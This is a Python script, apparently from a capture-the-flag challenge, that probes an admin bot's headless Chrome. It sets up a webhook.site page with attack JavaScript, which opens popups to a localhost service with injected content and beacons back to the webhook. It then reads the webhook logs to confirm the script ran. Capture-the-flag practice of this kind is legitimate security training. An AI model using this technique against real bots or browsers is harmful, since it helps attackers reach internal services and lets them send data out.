"""
Step 1: Test if window.open() works in the bot's headless Chrome.
We configure webhook.site to return an HTML page with JS that opens a popup.
If the popup URL shows up in webhook logs, window.open() works.
"""
import requests
import urllib.parse
import time
import urllib3
import json

urllib3.disable_warnings()

BOT = "https://bot-9cf8d8cc310eff6b.chal.ctf.ae"

# Create a fresh webhook token for the attack page
r = requests.post('https://webhook.site/token')
wh = r.json()
WH_UUID = wh['uuid']
print(f"[*] Created webhook token: {WH_UUID}")
WH_URL = f"https://webhook.site/{WH_UUID}"

# Set up the webhook to return our attack HTML
attack_html = f"""<!DOCTYPE html>
<html><body>
<script>
// Test 1: Does window.open work?
var w = window.open('{WH_URL}/popup_test_ok');

// Test 2: After 2s, try opening the target with the token
setTimeout(function() {{
    var w2 = window.open('http://127.0.0.1:3000/?content=test_from_external');
    // After 1 more second, report back
    setTimeout(function() {{
        new Image().src = '{WH_URL}/external_js_alive';
    }}, 1000);
}}, 2000);
</script>
<p>Attack page loaded</p>
</body></html>"""

# Update webhook default response
r = requests.put(
    f'https://webhook.site/token/{WH_UUID}',
    json={
        'default_content': attack_html,
        'default_content_type': 'text/html',
        'default_status': 200,
    }
)
print(f"[*] Webhook configured: {r.status_code}")

# Send the webhook URL to the bot
print(f"[*] Reporting {WH_URL} to bot...")
t0 = time.time()
r = requests.post(f"{BOT}/api/report", json={"url": WH_URL}, verify=False, timeout=40)
elapsed = round(time.time() - t0, 2)
print(f"[*] Bot returned {r.status_code} in {elapsed}s")

# Check webhook logs
time.sleep(3)
r = requests.get(f'https://webhook.site/token/{WH_UUID}/requests')
data = r.json()
print(f"[*] Total requests received: {data.get('total')}")
for req in data.get('data', []):
    url = req.get('url', '')
    method = req.get('method', '')
    ua = req.get('user_agent', '')[:60]
    print(f"    [{method}] {url}")
    if 'popup_test_ok' in url:
        print("    >>> window.open() WORKS!")
    if 'external_js_alive' in url:
        print("    >>> JS execution on external page confirmed!")
